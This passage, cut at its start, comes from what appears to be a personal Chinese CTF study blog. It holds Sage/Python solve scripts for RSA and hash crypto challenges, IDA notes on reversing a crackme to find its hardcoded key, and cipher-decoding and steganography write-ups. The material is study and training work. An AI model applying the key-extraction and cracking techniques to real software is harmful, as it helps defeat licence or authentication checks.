class="number">39978</span>*x^<span class="number">5</span> + <span class="number">4693</span>*x^<span class="number">4</span> + <span class="number">11578</span>*x^<span class="number">3</span> + <span class="number">36393</span>*x^<span class="number">2</span> + <span class="number">14946</span>*x + <span class="number">43777</span></span><br><span class="line">sage: q</span><br><span class="line"><span class="number">26089</span>*x^<span class="number">5</span> + <span class="number">12232</span>*x^<span class="number">4</span> + <span class="number">20416</span>*x^<span class="number">3</span> + <span class="number">26651</span>*x^<span class="number">2</span> + <span class="number">26160</span>*x + <span class="number">11919</span></span><br><span class="line">sage: r</span><br><span class="line"><span class="number">16643</span>*x^<span class="number">5</span> + <span class="number">38547</span>*x^<span class="number">4</span> + <span class="number">21632</span>*x^<span class="number">3</span> + <span class="number">22341</span>*x^<span class="number">2</span> + <span class="number">25740</span>*x + <span class="number">23376</span></span><br></pre></td></tr></table></figure>

<h1 id="230210"><a href="#230210" class="headerlink" title="230210"></a>230210</h1><h2 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">86073852484226203700520112718689325205597071202320413471730820840719099334770</span></span><br><span class="line">n2 = <span class="number">77582485123791158683121280616703899430016469065264033598472741751344256774648355531493586310864150337351815051848231793841751148287075688226384710343269278032576253497728407800522536152937473072438970839941923618053297480433385258911357458745700958378269978384670108026994918504237309072908971746160378531040480539649223970964653553804442759847964633088481940435582792404175653758785321463055628690804551479982557193366035172983893595403859872458966844805671311011033726279121149599533093604586152158331657286488305064843651636225644328162652701896037366058322959361248649656784810609391313</span></span><br><span class="line">c3 = <span class="number">260434870216758498838321584935711394249835963213639852217120194663627852693180232036075839403208332707552953757185774603238436545434522971149891312380970896040823539050341723863717581297624370198483155582245220695123793458717418658539983101802256991837534210806768587736557644192367876024337837658337683388449336720569707094997412847022794461117019613124291022681935875774139147643806772608929174881451749463825639214096129554621195116737322890163556732291246108250543079041977037626755130422879778449546701988814607595746282148723362288451970833214072743929855505520539885650891349827459470540263153862109871050950881032032388185414677989393461533362690744724752363346530211163516319373099647590952338730</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># 1. 分解n中的p, q</span></span><br><span class="line"><span class="string">sage:</span></span><br><span class="line"><span class="string">two_squares(n)</span></span><br><span class="line"><span class="string">(200170033707580057053975766783012322797,</span></span><br><span class="line"><span class="string"> 214489650309129059054871357172058931331)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p1 = <span class="number">200170033707580057053975766783012322797</span></span><br><span class="line">q1 = <span class="number">214489650309129059054871357172058931331</span></span><br><span class="line">q1 = q1 + <span class="number">63066105847160076051036559850646146794</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"># 2. 利用基底转换分解</span></span><br><span class="line"><span class="string">poly = sum(e * x^i for i, e in enumerate( Integer(n2).digits(q1)))</span></span><br><span class="line"><span class="string">sage: poly</span></span><br><span class="line"><span class="string">17358416697006*x^15 + 50380288275413*x^14 + 65697715730413*x^13 + 119331879197637*x^12 + 190079269759081*x^11 + 251069112740272*x^10 + 294191461464860*x^9 + 323192668237103*x^8 + 348744847375959*x^7 + 327797569086986*x^6 + 281393100562123*x^5 + 205257017269623*x^4 + 147796447331070*x^3 + 92272297080147*x^2 + 44365143036564*x + 12197084000688</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(p, _), (q, _), (r, _) = poly.factor_list()</span></span><br><span class="line"><span class="string">sage: p</span></span><br><span class="line"><span class="string">39978*x^5 + 4693*x^4 + 11578*x^3 + 36393*x^2 + 14946*x + 43777</span></span><br><span class="line"><span class="string">sage: q</span></span><br><span class="line"><span class="string">26089*x^5 + 12232*x^4 + 20416*x^3 + 26651*x^2 + 26160*x + 11919</span></span><br><span class="line"><span class="string">sage: r</span></span><br><span class="line"><span class="string">16643*x^5 + 38547*x^4 + 21632*x^3 + 22341*x^2 + 25740*x + 23376</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> p, q, r = p(x = q1), q(x = q1), r(x = q1)</span></span><br><span class="line"><span class="string">sage: assert p*q*r == n2</span></span><br><span class="line"><span class="string">sage: p1</span></span><br><span class="line"><span class="string">200170033707580057053975766783012322797</span></span><br><span class="line"><span class="string">sage: p</span></span><br><span class="line"><span class="string">65852498339760915228594889597136378107876107334695562152983809050259001488139010835535729480582643283480229654777004862320849604335829446520865511011593811440123502620735962409526109695434570356277</span></span><br><span class="line"><span class="string">sage: q</span></span><br><span class="line"><span class="string">42974281584522050062504679441184925920720278381761957641733614118720547476055402383959476142344396618643274705251619494499668048977089541037606316780609473959806621223833644762635231018066406261919</span></span><br><span class="line"><span class="string">sage: r</span></span><br><span class="line"><span class="string">27414656307685249691067705927388582241684529669740981719565564735302197575673076783872355553268011939023273356472727941960439764826793614011976095106476097211511966378338911454193294048309326195251</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p = <span class="number">65852498339760915228594889597136378107876107334695562152983809050259001488139010835535729480582643283480229654777004862320849604335829446520865511011593811440123502620735962409526109695434570356277</span></span><br><span class="line">q = <span class="number">42974281584522050062504679441184925920720278381761957641733614118720547476055402383959476142344396618643274705251619494499668048977089541037606316780609473959806621223833644762635231018066406261919</span></span><br><span class="line">r = <span class="number">27414656307685249691067705927388582241684529669740981719565564735302197575673076783872355553268011939023273356472727941960439764826793614011976095106476097211511966378338911454193294048309326195251</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">3. 根据原加密函数进行判断</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p1=next_prime(p1)</span><br><span class="line">    p=next_prime(p)</span><br><span class="line">    q=next_prime(q)</span><br><span class="line">    r=next_prime(r)</span><br><span class="line">    <span class="keyword">if</span> (p-<span class="number">1</span>)%<span class="number">7</span>==<span class="number">0</span> <span class="keyword">and</span> (q-<span class="number">1</span>)%<span class="number">7</span> ==<span class="number">0</span> <span class="keyword">and</span> (r-<span class="number">1</span>)%<span class="number">7</span>==<span class="number">0</span> <span class="keyword">and</span> (p1-<span class="number">1</span>)%<span class="number">7</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span>   </span><br><span class="line"></span><br><span class="line"><span class="comment"># print(p1)</span></span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line"><span class="comment"># print(q)</span></span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line">        </span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">3. p域下解方程（flag未padding，在p域下可求解）</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>        </span><br><span class="line">P.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x^<span class="number">7</span> - c3</span><br><span class="line">res = f.roots()</span><br><span class="line"><span class="comment"># print(res)</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;DASCTF&#123;&#x27;</span> <span class="keyword">in</span> long_to_bytes(<span class="built_in">int</span>(i[<span class="number">0</span>])):</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(i[<span class="number">0</span>])))</span><br></pre></td></tr></table></figure>

<p><em>中间遇到判定没成功，也就是while true代码块没跑出结果，后来发现得用gmpy库中的next_prime()函数来加快。</em></p>
<h2 id="VSC编译相关一点问题"><a href="#VSC编译相关一点问题" class="headerlink" title="VSC编译相关一点问题"></a>VSC编译相关一点问题</h2><p>主要安装编译之后生成的是64位的，编译好之后的程序文件是64位的，逆向后的显示有一点区别，稍微逆向查看伪代码以及汇编会相对麻烦一点。</p>
<p><em>VSC整个32位编译环境？</em></p>
<h3 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h3><ul>
<li>Windows环境之下如何编译成32位程序？</li>
<li>VSCode配置还原。或者说假设成功，那两者如何切换？</li>
</ul>
<h2 id="出题思路"><a href="#出题思路" class="headerlink" title="出题思路"></a>出题思路</h2><blockquote>
<p>思路来源，上面的图穷匕见。</p>
</blockquote>
<h3 id="crypto1"><a href="#crypto1" class="headerlink" title="crypto1"></a>crypto1</h3><ul>
<li>Feistel结构</li>
<li>Groebner basis方程</li>
<li>密码学题目也比较合适</li>
</ul>
<h1 id="230213"><a href="#230213" class="headerlink" title="230213"></a>230213</h1><h2 id="n2-digits-q2-——easyrsa"><a href="#n2-digits-q2-——easyrsa" class="headerlink" title="n2.digits(q2)——easyrsa"></a>n2.digits(q2)——easyrsa</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p, q, r = [gen_prime() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">sage: p</span><br><span class="line"><span class="number">7420106539</span></span><br><span class="line">sage: q</span><br><span class="line"><span class="number">16025170573</span></span><br><span class="line">sage: r</span><br><span class="line"><span class="number">15865175743</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n2 = p * q * r</span><br><span class="line">sage: n2.digits(<span class="number">13</span>)</span><br><span class="line">[<span class="number">9</span>,</span><br><span class="line"> <span class="number">12</span>,</span><br><span class="line"> <span class="number">1</span>,</span><br><span class="line"> <span class="number">1</span>,</span><br><span class="line"> <span class="number">11</span>,</span><br><span class="line"> <span class="number">10</span>,</span><br><span class="line"> <span class="number">10</span>,</span><br><span class="line"> <span class="number">2</span>,</span><br><span class="line"> <span class="number">2</span>,</span><br><span class="line"> <span class="number">6</span>,</span><br><span class="line"> <span class="number">2</span>,</span><br><span class="line"> <span class="number">5</span>,</span><br><span class="line"> <span class="number">3</span>,</span><br><span class="line"> <span class="number">11</span>,</span><br><span class="line"> <span class="number">12</span>,</span><br><span class="line"> <span class="number">3</span>,</span><br><span class="line"> <span class="number">12</span>,</span><br><span class="line"> <span class="number">4</span>,</span><br><span class="line"> <span class="number">12</span>,</span><br><span class="line"> <span class="number">12</span>,</span><br><span class="line"> <span class="number">5</span>,</span><br><span class="line"> <span class="number">5</span>,</span><br><span class="line"> <span class="number">6</span>,</span><br><span class="line"> <span class="number">6</span>,</span><br><span class="line"> <span class="number">4</span>,</span><br><span class="line"> <span class="number">7</span>,</span><br><span class="line"> <span class="number">7</span>,</span><br><span class="line"> <span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">for</span> i,e <span class="keyword">in</span> <span class="built_in">enumerate</span>(n2.digits(<span class="number">13</span>)):</span><br><span class="line">....:     <span class="built_in">print</span>(e * x^i)</span><br><span class="line">....:</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">12</span>*x</span><br><span class="line">x^<span class="number">2</span></span><br><span class="line">x^<span class="number">3</span></span><br><span class="line"><span class="number">11</span>*x^<span class="number">4</span></span><br><span class="line"><span class="number">10</span>*x^<span class="number">5</span></span><br><span class="line"><span class="number">10</span>*x^<span class="number">6</span></span><br><span class="line"><span class="number">2</span>*x^<span class="number">7</span></span><br><span class="line"><span class="number">2</span>*x^<span class="number">8</span></span><br><span class="line"><span class="number">6</span>*x^<span class="number">9</span></span><br><span class="line"><span class="number">2</span>*x^<span class="number">10</span></span><br><span class="line"><span class="number">5</span>*x^<span class="number">11</span></span><br><span class="line"><span class="number">3</span>*x^<span class="number">12</span></span><br><span class="line"><span class="number">11</span>*x^<span class="number">13</span></span><br><span class="line"><span class="number">12</span>*x^<span class="number">14</span></span><br><span class="line"><span class="number">3</span>*x^<span class="number">15</span></span><br><span class="line"><span class="number">12</span>*x^<span class="number">16</span></span><br><span class="line"><span class="number">4</span>*x^<span class="number">17</span></span><br><span class="line"><span class="number">12</span>*x^<span class="number">18</span></span><br><span class="line"><span class="number">12</span>*x^<span class="number">19</span></span><br><span class="line"><span class="number">5</span>*x^<span class="number">20</span></span><br><span class="line"><span class="number">5</span>*x^<span class="number">21</span></span><br><span class="line"><span class="number">6</span>*x^<span class="number">22</span></span><br><span class="line"><span class="number">6</span>*x^<span class="number">23</span></span><br><span class="line"><span class="number">4</span>*x^<span class="number">24</span></span><br><span class="line"><span class="number">7</span>*x^<span class="number">25</span></span><br><span class="line"><span class="number">7</span>*x^<span class="number">26</span></span><br><span class="line">x^<span class="number">27</span></span><br></pre></td></tr></table></figure>

<p>迭代器，以字典或者列表的形式进行输出。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sage: <span class="built_in">enumerate</span>(n2.digits(<span class="number">13</span>))</span><br><span class="line">&lt;<span class="built_in">enumerate</span> <span class="built_in">object</span> at <span class="number">0x6ffe36f95550</span>&gt;</span><br><span class="line">sage: <span class="built_in">list</span>(<span class="built_in">enumerate</span>(n2.digits(<span class="number">13</span>)))</span><br><span class="line">[(<span class="number">0</span>, <span class="number">9</span>),</span><br><span class="line"> (<span class="number">1</span>, <span class="number">12</span>),</span><br><span class="line"> (<span class="number">2</span>, <span class="number">1</span>),</span><br><span class="line"> (<span class="number">3</span>, <span class="number">1</span>),</span><br><span class="line"> (<span class="number">4</span>, <span class="number">11</span>),</span><br><span class="line"> (<span class="number">5</span>, <span class="number">10</span>),</span><br><span class="line"> (<span class="number">6</span>, <span class="number">10</span>),</span><br><span class="line"> (<span class="number">7</span>, <span class="number">2</span>),</span><br><span class="line"> (<span class="number">8</span>, <span class="number">2</span>),</span><br><span class="line"> (<span class="number">9</span>, <span class="number">6</span>),</span><br><span class="line"> (<span class="number">10</span>, <span class="number">2</span>),</span><br><span class="line"> (<span class="number">11</span>, <span class="number">5</span>),</span><br><span class="line"> (<span class="number">12</span>, <span class="number">3</span>),</span><br><span class="line"> (<span class="number">13</span>, <span class="number">11</span>),</span><br><span class="line"> (<span class="number">14</span>, <span class="number">12</span>),</span><br><span class="line"> (<span class="number">15</span>, <span class="number">3</span>),</span><br><span class="line"> (<span class="number">16</span>, <span class="number">12</span>),</span><br><span class="line"> (<span class="number">17</span>, <span class="number">4</span>),</span><br><span class="line"> (<span class="number">18</span>, <span class="number">12</span>),</span><br><span class="line"> (<span class="number">19</span>, <span class="number">12</span>),</span><br><span class="line"> (<span class="number">20</span>, <span class="number">5</span>),</span><br><span class="line"> (<span class="number">21</span>, <span class="number">5</span>),</span><br><span class="line"> (<span class="number">22</span>, <span class="number">6</span>),</span><br><span class="line"> (<span class="number">23</span>, <span class="number">6</span>),</span><br><span class="line"> (<span class="number">24</span>, <span class="number">4</span>),</span><br><span class="line"> (<span class="number">25</span>, <span class="number">7</span>),</span><br><span class="line"> (<span class="number">26</span>, <span class="number">7</span>),</span><br><span class="line"> (<span class="number">27</span>, <span class="number">1</span>)]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(p, _), (q, _), (r, _) = poly.factor_list()</span><br><span class="line"><span class="comment"># 对poly多项式进行因式分解，使得得到p,q,r对应的多项式</span></span><br><span class="line"><span class="comment"># 此时p,q,r即为x = q1代入后的数值</span></span><br><span class="line">p, q, r = p(x = q1), q(x = q1), r(x = q1)</span><br><span class="line"><span class="keyword">assert</span> p*q*r == n2</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用原加密函数得到真实的p1, p, q, r</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p1=next_prime(p1)</span><br><span class="line">    p=next_prime(p)</span><br><span class="line">    q=next_prime(q)</span><br><span class="line">    r=next_prime(r)</span><br><span class="line">    <span class="keyword">if</span> (p-<span class="number">1</span>)%<span class="number">7</span>==<span class="number">0</span> <span class="keyword">and</span> (q-<span class="number">1</span>)%<span class="number">7</span> ==<span class="number">0</span> <span class="keyword">and</span> (r-<span class="number">1</span>)%<span class="number">7</span>==<span class="number">0</span> <span class="keyword">and</span> (p1-<span class="number">1</span>)%<span class="number">7</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这一模块无法计算出d，主要是因为原加密函数是经过判定才最终输出的。而判定为 -1 % 7。</span></span><br><span class="line"><span class="comment"># N = (p1 - 1)*(p1**2) * (p - 1) * (q - 1) * (r - 1)</span></span><br><span class="line"><span class="comment"># d = invert(mpz(e), mpz(N))</span></span><br><span class="line"><span class="comment"># print(d)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义整数域模p的未知量x</span></span><br><span class="line"><span class="comment"># 在p域下求解方程</span></span><br><span class="line"><span class="comment"># 根为可能解，利用long_to_bytes()得到最终flag</span></span><br><span class="line">P.&lt;x&gt; = Zmod(p)[] </span><br><span class="line">f = x^<span class="number">7</span> - c3 </span><br><span class="line">res = f.roots() </span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<h2 id="easy-hash"><a href="#easy-hash" class="headerlink" title="easy_hash"></a>easy_hash</h2><p>根据<code>myhash()</code>函数，因为$a_0$的位数小于500位，所以$a_0$就是<code>flag</code>各个部分和其<code>crc32()</code>拼接后的结果，把crc32验证的结果去掉就是<code>flag</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P = <span class="number">93327214260434303138080906179883696131283277062733597039773430143631378719403851851296505697016458801222349445773245718371527858795457860775687842513513120173676986599209741174960099561600915819416543039173509037555167973076303047419790245327596338909743308199889740594091849756693219926218111062780849456373</span></span><br><span class="line">a1, secret = (<span class="number">1768672211043417187765307394749760760531160781992300779145800061219666992833602547480090118225665457075744297987672863699370162614965380859290914620736</span>, <span class="number">89139545215288033432210221492974990584987914397112840989583439688211128705545477536596587262069032020212762581490561288493533363888589066045095054475929099275247145877699370608950340925139625068446642116123285918461312297390611577025368805438078034230342490499137494400676347225155752865648820807846513044723</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> crc32</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 原加密脚本的自定义函数保留下来</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myhash</span>(<span class="params">x</span>):</span><br><span class="line">    res = []</span><br><span class="line">    end = <span class="string">b&quot;&quot;</span></span><br><span class="line">    bytescipher = long_to_bytes(x)</span><br><span class="line">    a = bytescipher[:<span class="built_in">len</span>(bytescipher) % <span class="number">8</span>]</span><br><span class="line">    res.append(a)</span><br><span class="line">    res.append(long_to_bytes(crc32(a)))</span><br><span class="line">    t = (<span class="built_in">len</span>(bytescipher) // <span class="number">8</span>)</span><br><span class="line">    bytescipher = bytescipher[<span class="built_in">len</span>(bytescipher) % <span class="number">8</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">        a = bytescipher[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">        res.append(a)</span><br><span class="line">        res.append(long_to_bytes(crc32(a)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        end += i</span><br><span class="line">    res = bytes_to_long(end)</span><br><span class="line">    res = (res + (res &gt;&gt; <span class="number">500</span>)) &amp; <span class="number">2</span>**(<span class="number">500</span>) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># def encode(pt):</span></span><br><span class="line"><span class="comment">#     a=[]</span></span><br><span class="line"><span class="comment">#     b=[]</span></span><br><span class="line"><span class="comment">#     a.append(myhash(pt))</span></span><br><span class="line"><span class="comment">#     for i in range(3):</span></span><br><span class="line"><span class="comment">#         a.append(myhash(a[i]))</span></span><br><span class="line"><span class="comment">#     for j in range(4):</span></span><br><span class="line"><span class="comment">#         secret=(a[0] + a[1] * a[j] + a[2] * a[j] ** 2 + a[3] * a[j] ** 3) % P</span></span><br><span class="line"><span class="comment">#         b.append([a[j],secret])</span></span><br><span class="line"><span class="comment">#     return b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(P.bit_length())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 利用a1来求解a2, a3</span></span><br><span class="line">a2 = myhash(a1)</span><br><span class="line">a3 = myhash(a2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. a0利用secret, a1, a2, a3求解</span></span><br><span class="line">a0 = secret - (a1 * a1 + a2 * a1 ** <span class="number">2</span> + a3 * a1 ** <span class="number">3</span>) % P</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(a0))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 把crc32部分去除，即可得到flag</span></span><br><span class="line"><span class="comment"># b&#x27;DA\xd4\x17\xe9\xf8SCTF&#123;th1\x98\xf8\xa5$s_is_theS\x83\xbf\xc9_fe3st_q\x8f\xa9\xd4\xacuest1on&#125;\x07.B\xce&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;th1s_is_the_fe3st_quest1on&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="references"><a href="#references" class="headerlink" title="references"></a>references</h2><blockquote>
<p>some unread websites</p>
</blockquote>
<p><a href="https://blog.csdn.net/m0_62506844/article/details/124256746">(10条消息) 【zer0pts CTF 2022】 Anti-Fermat（p、q生成不当)_Paintrain的博客-CSDN博客_【zer0pts ctf 2022】anti-fermat</a></p>
<p><a href="https://blog.csdn.net/figfig55/article/details/127283671">(10条消息) crypto_solveit2022（rsa中coppersmith攻击应用）_山猪儿烦不得的博客-CSDN博客</a></p>
<p><a href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/README.md">hackergame2020-writeups&#x2F;README.md at master · USTC-Hackergame&#x2F;hackergame2020-writeups · GitHub</a></p>
<p><a href="https://blog.csdn.net/qq_53283643/article/details/128161307">(10条消息) DASCTF NOV X联合出题人2022年度积分榜争夺赛！Crypto Wp_dasctf nov x联合出题人2022年度积分榜争夺赛!_mxx307的博客-CSDN博客</a></p>
<p><a href="http://www.axiom-developer.org/axiom-website/download.html">Axiom Computer Algebra System (axiom-developer.org)</a></p>
<h1 id="230214"><a href="#230214" class="headerlink" title="230214"></a>230214</h1><h2 id="窗口程序逆向思维"><a href="#窗口程序逆向思维" class="headerlink" title="窗口程序逆向思维"></a>窗口程序逆向思维</h2><blockquote>
<p>以Test_A_Windows为例</p>
</blockquote>
<ul>
<li><p>主程序入手</p>
</li>
<li><p>API入手</p>
</li>
</ul>
<ol>
<li>直接<code>Shift + F12</code>，打开string界面，然后查看关键字符串。<em>本程序无法看到关键字符串，可能经过了编码转换。</em></li>
<li>查看API调用。<ol>
<li>读取的窗体中的字符串，一般调用了<code>GetWindowsText</code></li>
<li>弹窗，一般调用了<code>MessageBox</code></li>
<li>后面的<code>A</code>表示使用的编码形式，ASCII</li>
<li>按<code>x</code>查看调用情况，前往地址</li>
<li>红色时，无法按<code>F5</code>，此时IDA并未识别</li>
<li>定位，然后<code>Create Function</code>，再<code>F5</code>手动创建函数</li>
<li>中间涉及到<code>strcmp</code>，跟<strong>内联优化</strong>结合起来，此时需要对<strong>数据的来源</strong>进行查看</li>
<li>按<code>A</code>直接数值转化</li>
</ol>
</li>
<li><code>Test_A2.exe</code>主要出现问题：<em>粗虚线为内联优化</em></li>
</ol>
<img src="/2023/12/31/WeeklyStudy/image-20230214160444620.png" class="" title="内联优化">

<ul>
<li><em>ecx拿取1字节放到dl中</em> &lt;– 输入的字符串</li>
<li><em>eax拿取1字节放到dl中</em> &lt;– 原存储字符串</li>
<li><em>dl与dl进行比较</em></li>
<li>一般2字节进行一次比较，然后进行循环，具体知识点看OneNote</li>
</ul>
<ol start="4">
<li>然后真实需要的密钥就在内联优化的上面，稍微找一下。</li>
</ol>
<img src="/2023/12/31/WeeklyStudy/image-20230301111926826.png" class="" title="真实密钥">

<ul>
<li>去原存储的地方进行转换一下即可，<code>A</code></li>
</ul>
<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>内部的程序分析，分析过程进行整理。</p>
<h1 id="230215"><a href="#230215" class="headerlink" title="230215"></a>230215</h1><h2 id="decode"><a href="#decode" class="headerlink" title="decode"></a>decode</h2><blockquote>
<p>古典密码学综合。</p>
<p>直接看ciphey感觉更直接。</p>
</blockquote>
<ol>
<li>凯撒13</li>
<li>base16&#x2F;16进制转换</li>
<li>base64</li>
<li>ciphey直接得出</li>
</ol>
<img src="/2023/12/31/WeeklyStudy/image-20230216103912113.png" class="" title="ciphey">

<h2 id="！"><a href="#！" class="headerlink" title="！"></a>！</h2><ul>
<li>CakeRSA</li>
<li>逆向</li>
</ul>
<h1 id="230216"><a href="#230216" class="headerlink" title="230216"></a>230216</h1><h2 id="学习心得"><a href="#学习心得" class="headerlink" title="学习心得"></a>学习心得</h2><h3 id="学习笔记的编写"><a href="#学习笔记的编写" class="headerlink" title="学习笔记的编写"></a>学习笔记的编写</h3><ul>
<li>每周学习情况的汇总，有大致了解</li>
<li>知识点回顾，容易定位</li>
<li>有些问题，当时是遗留问题，后面可能又能解决了</li>
</ul>
<h3 id="密码学的数学推导"><a href="#密码学的数学推导" class="headerlink" title="密码学的数学推导"></a>密码学的数学推导</h3><ul>
<li>dp变种<ul>
<li>扩展1：$n \equiv p^{b} \cdot q $</li>
</ul>
</li>
<li>羊城杯Power<ul>
<li>dp扩展</li>
<li>数学推导，关键公式</li>
</ul>
</li>
<li>拟态的再复现<ul>
<li>多项式问题 -&gt; 多元方程组问题</li>
<li>数学推导</li>
</ul>
</li>
</ul>
<p>-&gt; 数学推导：费马小定理，简化本来比较复杂的等式。</p>
<p>-&gt; 多项式相关</p>
<h3 id="逆向相关基础以及工具运用"><a href="#逆向相关基础以及工具运用" class="headerlink" title="逆向相关基础以及工具运用"></a>逆向相关基础以及工具运用</h3><blockquote>
<p>主要还是需要把基础知识点应用实际。</p>
</blockquote>
<ul>
<li>前提环境搭建</li>
<li>简单逆向题目复现</li>
<li>结合内联优化后的题目<ul>
<li>TEST_A2</li>
</ul>
</li>
<li>偶然看到的结合密码学算法的逆向题目<ul>
<li>逆向考查难题，容易跟密码学进行结合</li>
<li>逆向需要把变量&#x2F;数据的变化过程了解</li>
</ul>
</li>
</ul>
<p>-&gt; C语言以及多分析</p>
<p>-&gt; 逆向技术学习论坛：看雪&#x2F;吾爱破解（工具包）</p>
<h3 id="遗留问题-1"><a href="#遗留问题-1" class="headerlink" title="遗留问题"></a>遗留问题</h3><ul>
<li>一些docker靶场环境无法运行等 -&gt; <em>明天试下docker看能不能直接运行</em></li>
<li>VSCODE，如何编译出32位程序文件</li>
<li>多项式相关定理学习</li>
</ul>
<h1 id="230217"><a href="#230217" class="headerlink" title="230217"></a>230217</h1><h2 id="分享后的遗留问题解决"><a href="#分享后的遗留问题解决" class="headerlink" title="分享后的遗留问题解决"></a>分享后的遗留问题解决</h2><ol>
<li>docker在尝试中</li>
<li>VSCode，如何编译出32位程序文件仍待解决<ol>
<li>可替代方案：使用VS选择debugger进行</li>
</ol>
</li>
<li>多项式定理，下周空了整吧</li>
</ol>
<h2 id="sqlmap重安装"><a href="#sqlmap重安装" class="headerlink" title="sqlmap重安装"></a>sqlmap重安装</h2><ul>
<li>报错了一堆问题，感觉是用的源有问题，先准备重新安装了</li>
<li>来来回回整活<code>apt-get</code>更新，回滚错误，麻爪了</li>
<li>事实证明还是得记得打个快照，kali彻底玩崩了。我去。</li>
<li>win7的父快照被我删没了，环境崩了。</li>
</ul>
<p><em>俩环境都废了，自闭了，毁灭吧世界。</em></p>
<h2 id="qwb-2021-misc-threebody"><a href="#qwb-2021-misc-threebody" class="headerlink" title="[qwb-2021-misc]threebody"></a>[qwb-2021-misc]threebody</h2><blockquote>
<p><a href="https://www.anquanke.com/post/id/244533">用图片讲一个故事——第五届强网杯Threebody题目官方题解-安全客 - 安全资讯平台 (anquanke.com)</a></p>
</blockquote>
<h3 id="stegsolve查看发现图片"><a href="#stegsolve查看发现图片" class="headerlink" title="stegsolve查看发现图片"></a>stegsolve查看发现图片</h3><p>你们都是虫子。</p>
<h3 id="放大发现像素点数"><a href="#放大发现像素点数" class="headerlink" title="放大发现像素点数"></a>放大发现像素点数</h3><p>相邻像素点数值相差较大。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230308100114529.png" class="" title="image-20230308100114529">

<p>仔细观察发现如果以4为周期相差像素点数值将相差不大。 -&gt; 修改像素点所占比特数<code>biBitCount 24 -&gt; 32</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230308094743609.png" class="" title="image-20230308094743609">

<p>得到真实图片。</p>
<img src="/2023/12/31/WeeklyStudy/threebody_output.bmp" class="" title="true threebody">

<h3 id="再使用solvesolve进行分析"><a href="#再使用solvesolve进行分析" class="headerlink" title="再使用solvesolve进行分析"></a>再使用solvesolve进行分析</h3><img src="/2023/12/31/WeeklyStudy/image-20230215130857823.png" class="">

<p><code>stegsolve</code>进行提取。行列都存在隐写数据。</p>
